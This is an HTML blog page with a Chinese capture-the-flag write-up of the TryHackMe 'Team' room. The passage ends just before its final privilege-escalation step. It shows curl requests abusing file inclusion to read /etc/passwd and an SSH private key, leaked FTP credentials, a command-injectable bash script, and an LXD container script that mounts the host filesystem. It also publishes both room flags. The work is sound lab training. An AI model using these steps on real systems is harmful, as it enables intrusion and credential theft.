@@ -1,0 +1,539 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Team | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="TryHackMe - Team 渗透测试报告基本信息   项目 内容    靶场名称 TryHackMe - Team   目标 IP 10.48.147.235   攻击机 本地主机 (Windows 11)   测试日期 2026-05-27   最终结果 获取 Root 权限，拿到两个 Flag   Flag 汇总   类型 Flag    User Flag THM&amp;#123;6Y0TX">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_Team">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_Team.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="TryHackMe - Team 渗透测试报告基本信息   项目 内容    靶场名称 TryHackMe - Team   目标 IP 10.48.147.235   攻击机 本地主机 (Windows 11)   测试日期 2026-05-27   最终结果 获取 Root 权限，拿到两个 Flag   Flag 汇总   类型 Flag    User Flag THM&amp;#123;6Y0TX">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-05-27T05:48:10.000Z">
+<meta property="article:modified_time" content="2026-05-27T12:19:06.378Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="ai">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_Team.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_Team',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2026-05-27 20:19:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">53</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Team</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-27T05:48:10.000Z" title="发表于 2026-05-27 13:48:10">2026-05-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-27T12:19:06.378Z" title="更新于 2026-05-27 20:19:06">2026-05-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="TryHackMe-Team-渗透测试报告"><a href="#TryHackMe-Team-渗透测试报告" class="headerlink" title="TryHackMe - Team 渗透测试报告"></a>TryHackMe - Team 渗透测试报告</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>靶场名称</td>
+<td>TryHackMe - Team</td>
+</tr>
+<tr>
+<td>目标 IP</td>
+<td>10.48.147.235</td>
+</tr>
+<tr>
+<td>攻击机</td>
+<td>本地主机 (Windows 11)</td>
+</tr>
+<tr>
+<td>测试日期</td>
+<td>2026-05-27</td>
+</tr>
+<tr>
+<td>最终结果</td>
+<td>获取 Root 权限，拿到两个 Flag</td>
+</tr>
+</tbody></table>
+<h2 id="Flag-汇总"><a href="#Flag-汇总" class="headerlink" title="Flag 汇总"></a>Flag 汇总</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>Flag</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>User Flag</td>
+<td><code>THM&#123;6Y0TXHz7c2d&#125;</code></td>
+</tr>
+<tr>
+<td>Root Flag</td>
+<td><code>THM&#123;fhqbznavfonq&#125;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-1-端口扫描"><a href="#1-1-端口扫描" class="headerlink" title="1.1 端口扫描"></a>1.1 端口扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> -p- <span class="token number">10.48</span>.147.235<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>21</td>
+<td>FTP</td>
+<td>vsFTPd 3.0.5</td>
+</tr>
+<tr>
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 7.6p1 Ubuntu</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td>Apache httpd 2.4.29</td>
+</tr>
+</tbody></table>
+<h3 id="1-2-Web-目录枚举"><a href="#1-2-Web-目录枚举" class="headerlink" title="1.2 Web 目录枚举"></a>1.2 Web 目录枚举</h3><p>访问 <code>http://10.48.147.235</code> 显示 Apache 默认页面，页面源码中包含注释提示域名 <code>team.thm</code>。</p>
+<p>将 <code>team.thm</code> 和 <code>dev.team.thm</code> 添加到 <code>/etc/hosts</code>：</p>
+<pre class="line-numbers language-none"><code class="language-none">10.48.147.235 team.thm dev.team.thm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="1-3-虚拟主机发现"><a href="#1-3-虚拟主机发现" class="headerlink" title="1.3 虚拟主机发现"></a>1.3 虚拟主机发现</h3><p>访问 <code>http://team.thm</code>，目录扫描发现 <code>/scripts/</code> 目录：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://team.thm <span class="token parameter variable">-w</span> /usr/share/wordlists/dirb/common.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>访问 <code>http://dev.team.thm</code> 发现子域名，其中存在文件包含漏洞。</p>
+<hr>
+<h2 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h2><h3 id="2-1-本地文件包含-LFI"><a href="#2-1-本地文件包含-LFI" class="headerlink" title="2.1 本地文件包含 (LFI)"></a>2.1 本地文件包含 (LFI)</h3><p><strong>漏洞位置：</strong> <code>http://dev.team.thm/script.php?page=</code></p>
+<p><strong>参数：</strong> <code>page</code> 存在本地文件包含漏洞</p>
+<h4 id="2-1-1-读取系统文件"><a href="#2-1-1-读取系统文件" class="headerlink" title="2.1.1 读取系统文件"></a>2.1.1 读取系统文件</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 读取 /etc/passwd</span>
+<span class="token function">curl</span> <span class="token string">"http://dev.team.thm/script.php?page=/etc/passwd"</span>
+
+<span class="token comment"># 读取 SSH 配置</span>
+<span class="token function">curl</span> <span class="token string">"http://dev.team.thm/script.php?page=/etc/ssh/sshd_config"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="2-1-2-提取-SSH-私钥"><a href="#2-1-2-提取-SSH-私钥" class="headerlink" title="2.1.2 提取 SSH 私钥"></a>2.1.2 提取 SSH 私钥</h4><p>通过 LFI 读取 <code>/etc/ssh/sshd_config</code> 时，发现文件末尾以注释形式包含了 dale 用户的 SSH 私钥：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token string">"http://dev.team.thm/script.php?page=/etc/ssh/sshd_config"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-A</span> <span class="token number">100</span> <span class="token string">"BEGIN"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>将提取到的私钥保存为 <code>dale_id_rsa</code>：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 保存私钥（示例结构）</span>
+<span class="token function">cat</span> <span class="token operator">></span> dale_id_rsa <span class="token operator">&lt;&lt;</span> <span class="token string">'EOF'
+-----BEGIN RSA PRIVATE KEY-----
+[私钥内容]
+-----END RSA PRIVATE KEY-----
+EOF</span>
+
+<span class="token function">chmod</span> <span class="token number">600</span> dale_id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="2-1-3-SSH-登录获取-User-Flag"><a href="#2-1-3-SSH-登录获取-User-Flag" class="headerlink" title="2.1.3 SSH 登录获取 User Flag"></a>2.1.3 SSH 登录获取 User Flag</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-i</span> dale_id_rsa <span class="token parameter variable">-o</span> <span class="token assign-left variable">StrictHostKeyChecking</span><span class="token operator">=</span>no dale@10.48.147.235<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>登录后获取 User Flag：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dale@team:~$ <span class="token function">cat</span> /home/dale/user.txt
+THM<span class="token punctuation">&#123;</span>6Y0TXHz7c2d<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="2-2-FTP-凭据泄露"><a href="#2-2-FTP-凭据泄露" class="headerlink" title="2.2 FTP 凭据泄露"></a>2.2 FTP 凭据泄露</h3><h4 id="2-2-1-发现-FTP-凭据"><a href="#2-2-1-发现-FTP-凭据" class="headerlink" title="2.2.1 发现 FTP 凭据"></a>2.2.1 发现 FTP 凭据</h4><p>通过 LFI 读取 Web 目录下的脚本文件：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token string">"http://dev.team.thm/script.php?page=/var/www/team.thm/scripts/script.old"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现 FTP 凭据：</p>
+<pre class="line-numbers language-none"><code class="language-none">用户名: ftpuser
+密码: T3@m$h@r3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="2-2-2-FTP-登录验证"><a href="#2-2-2-FTP-登录验证" class="headerlink" title="2.2.2 FTP 登录验证"></a>2.2.2 FTP 登录验证</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ftp</span> <span class="token number">10.48</span>.147.235
+<span class="token comment"># 用户名: ftpuser</span>
+<span class="token comment"># 密码: T3@m$h@r3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>FTP 中 <code>/home/ftpuser/workshare/New_site.txt</code> 提到了 dev 子域名和 id_rsa 策略。</p>
+<hr>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><h3 id="3-1-发现命令注入漏洞"><a href="#3-1-发现命令注入漏洞" class="headerlink" title="3.1 发现命令注入漏洞"></a>3.1 发现命令注入漏洞</h3><h4 id="3-1-1-枚举用户目录"><a href="#3-1-1-枚举用户目录" class="headerlink" title="3.1.1 枚举用户目录"></a>3.1.1 枚举用户目录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看 gyles 用户目录</span>
+<span class="token function">ls</span> <span class="token parameter variable">-la</span> /home/gyles/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>发现 <code>/home/gyles/admin_checks</code> 脚本，该脚本属于 gyles 用户且具有执行权限。</p>
+<h4 id="3-1-2-分析-admin-checks-脚本"><a href="#3-1-2-分析-admin-checks-脚本" class="headerlink" title="3.1.2 分析 admin_checks 脚本"></a>3.1.2 分析 admin_checks 脚本</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /home/gyles/admin_checks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>脚本内容：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+<span class="token builtin class-name">printf</span> <span class="token string">"Reading stats.<span class="token entity" title="\n">\n</span>"</span>
+<span class="token function">sleep</span> <span class="token number">1</span>
+<span class="token builtin class-name">printf</span> <span class="token string">"Reading stats..<span class="token entity" title="\n">\n</span>"</span>
+<span class="token function">sleep</span> <span class="token number">1</span>
+<span class="token builtin class-name">read</span> <span class="token parameter variable">-p</span> <span class="token string">"Enter name of person backing up the data: "</span> name
+<span class="token builtin class-name">echo</span> <span class="token variable">$name</span>  <span class="token operator">>></span> /var/stats/stats.txt
+<span class="token builtin class-name">read</span> <span class="token parameter variable">-p</span> <span class="token string">"Enter 'date' to timestamp the file: "</span> error
+<span class="token builtin class-name">printf</span> <span class="token string">"The Date is "</span>
+<span class="token variable">$error</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+<span class="token assign-left variable">date_save</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token string">"+%F-%H-%M"</span><span class="token variable">)</span></span>
+<span class="token function">cp</span> /var/stats/stats.txt /var/stats/stats-<span class="token variable">$date_save</span>.bak
+<span class="token builtin class-name">printf</span> <span class="token string">"Stats have been backed up<span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>关键发现：</strong> 第 10 行 <code>$error 2&gt;/dev/null</code> 存在命令注入漏洞，用户输入直接被当作命令执行。</p>
+<h4 id="3-1-3-命令注入限制"><a href="#3-1-3-命令注入限制" class="headerlink" title="3.1.3 命令注入限制"></a>3.1.3 命令注入限制</h4><p>bash 在变量展开后不会重新解析重定向和管道符，因此 <code>$error</code> 只支持简单命令，不支持 <code>&gt;</code>、<code>&gt;&gt;</code>、<code>|</code>、<code>&lt;&lt;</code> 等。</p>
+<p><strong>可行的注入方式：</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 直接执行命令</span>
+<span class="token function">id</span>
+<span class="token function">whoami</span>
+<span class="token function">ls</span> <span class="token parameter variable">-la</span> /root
+
+<span class="token comment"># 执行脚本文件</span>
+<span class="token function">bash</span> /tmp/script.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="3-2-发现-LXD-组提权路径"><a href="#3-2-发现-LXD-组提权路径" class="headerlink" title="3.2 发现 LXD 组提权路径"></a>3.2 发现 LXD 组提权路径</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">id</span> gyles
+<span class="token comment"># uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>gyles 用户属于 <code>lxd</code> 组（GID 108），可以通过 LXC 容器实现特权提升。</p>
+<h3 id="3-3-准备-LXC-镜像"><a href="#3-3-准备-LXC-镜像" class="headerlink" title="3.3 准备 LXC 镜像"></a>3.3 准备 LXC 镜像</h3><h4 id="3-3-1-下载-Alpine-最小根文件系统"><a href="#3-3-1-下载-Alpine-最小根文件系统" class="headerlink" title="3.3.1 下载 Alpine 最小根文件系统"></a>3.3.1 下载 Alpine 最小根文件系统</h4><p>在攻击机上下载 Alpine minirootfs：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dl-cdn.alpinelinux.org/alpine/v3.15/releases/x86_64/alpine-minirootfs-3.15.0-x86_64.tar.gz <span class="token parameter variable">-O</span> alpine.tgz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="3-3-2-上传镜像到靶机"><a href="#3-3-2-上传镜像到靶机" class="headerlink" title="3.3.2 上传镜像到靶机"></a>3.3.2 上传镜像到靶机</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> <span class="token parameter variable">-i</span> dale_id_rsa <span class="token parameter variable">-o</span> <span class="token assign-left variable">StrictHostKeyChecking</span><span class="token operator">=</span>no alpine.tgz dale@10.48.147.235:/tmp/alpine.tgz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="3-3-3-创建带元数据的-LXC-镜像"><a href="#3-3-3-创建带元数据的-LXC-镜像" class="headerlink" title="3.3.3 创建带元数据的 LXC 镜像"></a>3.3.3 创建带元数据的 LXC 镜像</h4><p>LXC 需要包含 <code>metadata.yaml</code> 的镜像格式，直接使用 raw rootfs 会导致导入静默失败：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在靶机上执行</span>
+<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /tmp/lxc_build/rootfs
+<span class="token builtin class-name">cd</span> /tmp/lxc_build
+
+<span class="token comment"># 解压 rootfs</span>
+<span class="token function">tar</span> xzf /tmp/alpine.tgz <span class="token parameter variable">-C</span> rootfs/
+
+<span class="token comment"># 创建 metadata.yaml</span>
+<span class="token function">cat</span> <span class="token operator">></span> metadata.yaml <span class="token operator">&lt;&lt;</span> <span class="token string">'EOF'
+architecture: x86_64
+creation_date: 1638300000
+properties:
+ architecture: x86_64
+ description: Alpine 3.15 x86_64
+ os: Alpine
+ release: "3.15"
+EOF</span>
+
+<span class="token comment"># 打包为 LXC 格式镜像</span>
+<span class="token function">tar</span> czf /tmp/alpine_lxc.tgz metadata.yaml rootfs/
+<span class="token function">chmod</span> <span class="token number">644</span> /tmp/alpine_lxc.tgz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="3-4-编写提权脚本"><a href="#3-4-编写提权脚本" class="headerlink" title="3.4 编写提权脚本"></a>3.4 编写提权脚本</h3><p>由于通过管道运行 <code>admin_checks</code> 时 snap 路径不在 <code>PATH</code> 中，需要编写脚本显式设置环境变量：</p>
+<p><strong><code>privesc.sh</code>：</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/snap/bin:<span class="token environment constant">$PATH</span>
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">LXD_DIR</span><span class="token operator">=</span>/var/snap/lxd/common/lxd
+
+<span class="token comment"># 清理之前的尝试</span>
+lxc delete privesc <span class="token parameter variable">--force</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+lxc image delete myimage <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+
+<span class="token comment"># 导入镜像</span>
+lxc image <span class="token function">import</span> /tmp/alpine_lxc.tgz <span class="token parameter variable">--alias</span> myimage <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>
+
+<span class="token comment"># 验证镜像</span>
+lxc image list <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>
+
+<span class="token comment"># 创建特权容器</span>
+lxc init myimage privesc <span class="token parameter variable">-c</span> <span class="token assign-left variable">security.privileged</span><span class="token operator">=</span>true <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>
+
+<span class="token comment"># 挂载宿主机根目录</span>
+lxc config device <span class="token function">add</span> privesc host-root disk <span class="token assign-left variable">source</span><span class="token operator">=</span>/ <span class="token assign-left variable">path</span><span class="token operator">=</span>/mnt/root <span class="token assign-left variable">recursive</span><span class="token operator">=</span>true <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>
+
+<span class="token comment"># 启动容器</span>
+lxc start privesc <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>
+
+<span class="token comment"># 等待容器启动</span>
+<span class="token function">sleep</span> <span class="token number">3</span>
+
+<span class="token comment"># 读取 Root Flag</span>
+lxc <span class="token builtin class-name">exec</span> privesc -- <span class="token function">cat</span> /mnt/root/root/root.txt <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>
+
+<span class="token comment"># 复制到可访问位置（备用）</span>
+lxc <span class="token builtin class-name">exec</span> privesc -- <span class="token function">cat</span> /mnt/root/root/root.txt <span class="token operator">></span> /tmp/root_flag <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+<span class="token function">chmod</span> <span class="token number">644</span> /tmp/root_flag <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上传脚本到靶机：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> <span class="token parameter variable">-i</span> dale_id_rsa <span class="token parameter variable">-o</span> <span class="token assign-left variable">StrictHostKeyChecking</span><span class="token operator">=</span>no privesc.sh dale@10.48.147.235:/tmp/privesc.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="3-5-执行提权"><a href="#3-5-执行提权" class="headerlink" title="3.5 执行提权"></a>3.5 执行提权</h3><p>通过 <code>admin_checks</code> 的命令注入执行提权脚本：</p>
